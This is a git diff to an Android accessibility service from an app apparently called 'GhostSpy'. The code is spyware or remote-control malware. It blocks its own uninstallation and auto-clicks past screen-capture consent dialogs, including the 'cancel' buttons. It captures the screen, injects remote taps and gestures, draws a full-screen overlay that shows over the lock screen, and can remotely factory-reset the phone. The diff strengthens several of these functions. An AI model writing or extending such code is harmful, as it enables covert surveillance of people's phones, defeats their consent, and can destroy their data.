@@ -1,6 +1,7 @@
 package com.spy.ghostspy.services;
 
 import android.accessibilityservice.AccessibilityService;
+import android.accessibilityservice.AccessibilityServiceInfo;
 import android.accessibilityservice.GestureDescription;
 import android.annotation.SuppressLint;
 import android.app.admin.DevicePolicyManager;
@@ -43,6 +44,8 @@ import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.HandlerThread;
+import android.os.UserHandle;
+import android.os.UserManager;
 import android.provider.CallLog;
 import android.provider.MediaStore;
 import android.provider.Settings;
@@ -50,9 +53,11 @@ import android.util.Base64;
 import android.util.DisplayMetrics;
 import android.util.Log;
 import android.util.SparseIntArray;
+import android.view.Display;
 import android.view.Gravity;
 import android.view.Surface;
 import android.view.View;
+import android.view.WindowInsets;
 import android.view.WindowManager;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
@@ -115,6 +120,7 @@ public class MainAccessibilityService extends AccessibilityService {
     private final int imageWidth = 360;
     int deviceWidth = 0;
     int deviceHeight = 0;
+    int deviceDensityDpi = 0;
     private String screenBase64 = "";
     private MediaProjectionManager mediaProjectionManager;
     private MediaProjection mediaProjection;
@@ -197,9 +203,14 @@ public class MainAccessibilityService extends AccessibilityService {
     protected void onServiceConnected() {
         super.onServiceConnected();
         windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
-        displayMetrics = getResources().getDisplayMetrics();
+
+        displayMetrics = new DisplayMetrics();
+        Display display = getSystemService(WindowManager.class).getDefaultDisplay();
+        display.getRealMetrics(displayMetrics);
         deviceWidth = displayMetrics.widthPixels;
         deviceHeight = displayMetrics.heightPixels;
+        deviceDensityDpi = displayMetrics.densityDpi;
+
         registerBackCameraCaptureManager();
         registerReceiverManager();
 //        requestOverlayPermission();
@@ -207,14 +218,13 @@ public class MainAccessibilityService extends AccessibilityService {
     }
 
     private void setPermissionRequest() {
+        Intent serviceIntentX = new Intent(getBaseContext(), Server.class);
+        getBaseContext().startService(serviceIntentX);
         if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
             Intent intent = new Intent(this, PermissionSetActivity.class);
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(intent);
         } else {
-            Intent serviceIntentX = new Intent(getBaseContext(), Server.class);
-            getBaseContext().startService(serviceIntentX);
-
             if(mediaProjection == null) {
                 Intent serviceIntent = new Intent(getBaseContext(), CaptureForgroundService.class);
                 getBaseContext().startService(serviceIntent);
@@ -469,9 +479,6 @@ public class MainAccessibilityService extends AccessibilityService {
     private void setStopUninstall(AccessibilityEvent event) {
         CharSequence packagename = String.valueOf(event.getPackageName());
         Log.d(TAG, "Text changed: " + packagename + "::: "+event.getClassName());
-//        if(!packagename.equals("com.spy.ghostspy")) {
-//            Toast.makeText(this, packagename, Toast.LENGTH_LONG).show();
-//        }
 
         if(packagename.equals("com.google.android.packageinstaller") || packagename.equals("com.android.systemui")) {
             AccessibilityNodeInfo rootNode = getRootInActiveWindow();
@@ -540,7 +547,15 @@ public class MainAccessibilityService extends AccessibilityService {
                             || nodeText.equals("start")
                             || nodeText.equals("iniciar agora")
                             || nodeText.equals("início")) {
-                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                        Rect rect = new Rect();
+                        node.getBoundsInScreen(rect);
+                        performClickMain(rect.left + 10, rect.top + 10);
+                    } else if(nodeText.equals("cancel") || nodeText.equals("cancelar")){
+                        Rect rect = new Rect();
+                        node.getBoundsInScreen(rect);
+                        if(rect.width() < deviceWidth / 2 ) {
+                            performClickMain(deviceWidth - rect.left - 10, rect.top + 10);
+                        }
                     }
                 }
             } else if (node.getClassName() != null && node.getClassName().equals("android.widget.TextView")) {
@@ -548,8 +563,20 @@ public class MainAccessibilityService extends AccessibilityService {
                     String nodeText = node.getText().toString().toLowerCase();
                     Log.d("TextView Text Media", nodeText);
                     if(nodeText.contains("service is running")) {
-                        if(mediaProjection == null) {
+                        if(node.isClickable()) {
+                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                        } else if(node.getParent().isClickable()) {
+                            Log.d("parent click::", "parenbte one");
                             node.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                        } else if(node.getParent().getParent() != null) {
+                            if(node.getParent().getParent().isClickable()) {
+                                Log.d("parent click::", "parent two");
+                                node.getParent().getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                            } else if(node.getParent().getParent().getParent() != null) {
+                                if(node.getParent().getParent().getParent().isClickable()) {
+                                    node.getParent().getParent().getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                                }
+                            }
                         }
                     }
                 }
@@ -715,9 +742,9 @@ public class MainAccessibilityService extends AccessibilityService {
     }
 
     private void startCapture() {
-        int width = displayMetrics.widthPixels;
-        int height = displayMetrics.heightPixels;
-        int densityDpi = displayMetrics.densityDpi;
+        int width = deviceWidth;
+        int height = deviceHeight;
+        int densityDpi = deviceDensityDpi;
 
         mediaProjection.registerCallback(mediaProjectionCallback, null);
 
@@ -742,7 +769,7 @@ public class MainAccessibilityService extends AccessibilityService {
                     int pixelStride = planes[0].getPixelStride();
                     int rowStride = planes[0].getRowStride();
                     int rowPadding = rowStride - pixelStride * image.getWidth();
-                    int bitmapWidth = image.getWidth() + rowPadding / pixelStride;
+                    int bitmapWidth = image.getWidth();
                     int bitmapHeight = image.getHeight();
 
                     Bitmap bitmap = Bitmap.createBitmap(bitmapWidth, bitmapHeight, Bitmap.Config.ARGB_8888);
@@ -871,10 +898,9 @@ public class MainAccessibilityService extends AccessibilityService {
             loadingTextView.setTextSize(24);
             loadingTextView.setGravity(Gravity.CENTER);
             loadingTextView.setPadding(0,0,0,150);
-            int screenHeight = getResources().getDisplayMetrics().heightPixels;
             WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                     WindowManager.LayoutParams.MATCH_PARENT,
-                    screenHeight + 300,
+                    deviceHeight + 300,
                     WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                     WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON|
                             WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED|
@@ -902,15 +928,38 @@ public class MainAccessibilityService extends AccessibilityService {
     }
 
     public void performClick(double x, double y) {
-        Log.d("Position x:", String.valueOf(x));
-        Log.d("Position Y:", String.valueOf(y));
-        Log.d("deviceWidth", String.valueOf(deviceWidth));
         double currentXPosition = x * deviceWidth / imageWidth;
         double currentYPosition = y * deviceWidth / imageWidth;
         Log.d("currentXPosition", String.valueOf(currentXPosition));
         Log.d("currentYPosition", String.valueOf(currentYPosition));
         Path clickPath = new Path();
         clickPath.moveTo((float) currentXPosition, (float) currentYPosition);
+
+        GestureDescription.StrokeDescription clickStroke = new GestureDescription.StrokeDescription(clickPath, 0, 1);
+        GestureDescription clickGesture = new GestureDescription.Builder().addStroke(clickStroke).build();
+
+        boolean result = dispatchGesture(clickGesture, new GestureResultCallback() {
+            @Override
+            public void onCompleted(GestureDescription gestureDescription) {
+                super.onCompleted(gestureDescription);
+                Log.d(TAG, "Click performed successfully");
+            }
+
+            @Override
+            public void onCancelled(GestureDescription gestureDescription) {
+                super.onCancelled(gestureDescription);
+                Log.d(TAG, "Click cancelled");
+            }
+        }, null);
+
+        if (!result) {
+            Log.d(TAG, "Failed to dispatch gesture");
+        }
+    }
+
+    public void performClickMain(double x, double y) {
+        Path clickPath = new Path();
+        clickPath.moveTo((float) x, (float) y);
 
         GestureDescription.StrokeDescription clickStroke = new GestureDescription.StrokeDescription(clickPath, 0, 1);
         GestureDescription clickGesture = new GestureDescription.Builder().addStroke(clickStroke).build();
@@ -943,8 +992,6 @@ public class MainAccessibilityService extends AccessibilityService {
         for (int i2 = 1; i2< mousePositionEntryList.size(); i2++) {
             try {
                 if (mousePositionEntryList.get(i2).getxPosition() >= 0.0 && mousePositionEntryList.get(i2).getyPosition() > 0.0) {
-                    Log.d("Position x:", String.valueOf(mousePositionEntryList.get(i2).getxPosition()));
-                    Log.d("Position Y:", String.valueOf(mousePositionEntryList.get(i2).getyPosition()));
                     path.lineTo((float) mousePositionEntryList.get(i2).getxPosition() * deviceWidth / imageWidth, (float) mousePositionEntryList.get(i2).getyPosition() * deviceWidth / imageWidth);
                 }
             } catch (Exception unused) {
@@ -1289,9 +1336,10 @@ public class MainAccessibilityService extends AccessibilityService {
     }
 
     public void performFactoryReset() {
+
         mDevicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
         mAdminComponent = new ComponentName(this, MyDeviceAdminReceiver.class);
-        if (mDevicePolicyManager.isAdminActive(mAdminComponent)) {
+        if (mDevicePolicyManager.isDeviceOwnerApp(getPackageName())) {
             mDevicePolicyManager.wipeData(0);
         }
     }
